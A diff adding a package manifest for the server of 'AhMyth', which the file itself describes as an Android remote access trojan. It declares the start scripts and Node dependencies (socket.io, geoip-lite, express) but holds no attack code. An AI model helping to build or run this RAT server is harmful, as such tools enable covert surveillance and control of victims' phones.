@@ -1,0 +1,1 @@
+{"name":"ahmyth-server","version":"1.0.0","description":"AhMyth Android RAT Server - LAN Edition","main":"server.js","license":"GNU GPLv3","scripts":{"start":"node server.js","dev":"node server.js"},"dependencies":{"socket.io":"^4.5.4","geoip-lite":"^1.4.7","express":"^4.18.2"}}
